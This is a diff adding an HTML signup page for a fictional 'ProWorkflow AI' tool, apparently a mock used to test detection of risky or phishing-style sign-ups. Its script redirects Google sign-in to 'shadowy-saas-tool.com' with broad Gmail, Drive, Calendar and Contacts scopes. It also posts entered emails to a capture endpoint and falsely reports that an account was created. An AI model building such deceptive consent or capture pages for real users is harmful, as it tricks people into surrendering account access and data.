@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>ProWorkflow AI - Smart Project Management</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; margin: 0; background: #f8f9fa; }
+        .header { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 40px 24px; text-align: center; }
+        .header h1 { margin: 0 0 8px; font-size: 32px; }
+        .header p { margin: 0; font-size: 16px; opacity: 0.9; }
+        .content { max-width: 500px; margin: 40px auto; padding: 0 16px; }
+        .signup-card { background: white; border-radius: 12px; padding: 32px; box-shadow: 0 2px 12px rgba(0,0,0,0.1); text-align: center; }
+        .signup-card h2 { margin: 0 0 24px; }
+        .google-btn { display: inline-flex; align-items: center; gap: 12px; background: white; border: 1px solid #ddd; border-radius: 4px; padding: 12px 24px; cursor: pointer; font-size: 15px; color: #444; }
+        .google-btn:hover { background: #f8f9fa; box-shadow: 0 1px 4px rgba(0,0,0,0.1); }
+        .google-btn .g-icon { width: 20px; height: 20px; background: #4285f4; border-radius: 50%; display: inline-block; }
+        .divider { margin: 24px 0; color: #999; font-size: 13px; }
+        input[type=email], input[type=password] { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 6px; margin: 8px 0; font-size: 14px; box-sizing: border-box; }
+        .btn { background: #667eea; color: white; border: none; padding: 14px 32px; border-radius: 6px; cursor: pointer; font-size: 16px; width: 100%; margin-top: 16px; }
+        .scopes { text-align: left; font-size: 12px; color: #888; margin-top: 16px; }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>ProWorkflow AI</h1>
+        <p>AI-powered project management for modern teams</p>
+    </div>
+    <div class="content">
+        <div class="signup-card">
+            <h2>Get Started Free</h2>
+            <button class="google-btn" onclick="googleSignIn()">
+                <span class="g-icon"></span>
+                Sign in with Google
+            </button>
+            <div class="divider">or sign up with email</div>
+            <input type="email" id="email" placeholder="Work email address">
+            <input type="password" id="password" placeholder="Create password">
+            <button class="btn" onclick="emailSignUp()">Sign Up</button>
+            <div class="scopes">
+                <p>By signing in with Google, you grant access to:</p>
+                <ul>
+                    <li>Google Drive (view and manage files)</li>
+                    <li>Gmail (read email and send on your behalf)</li>
+                    <li>Google Calendar (view and edit events)</li>
+                    <li>Google Contacts (read contacts)</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+    <script>
+        function googleSignIn() {
+            window.location.href = 'http://accounts.google.com/?redirect=http://shadowy-saas-tool.com&scope=drive,gmail,calendar,contacts';
+        }
+        function emailSignUp() {
+            const email = document.getElementById('email').value;
+            const pwd = document.getElementById('password').value;
+            fetch('/api/capture', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    site: 'shadowy-saas-tool.com',
+                    action: 'signup_with_corporate_email',
+                    email: email,
+                    password_length: pwd.length
+                })
+            });
+            alert('Account created! Check your email to verify.');
+        }
+    </script>
+</body>
+</html>
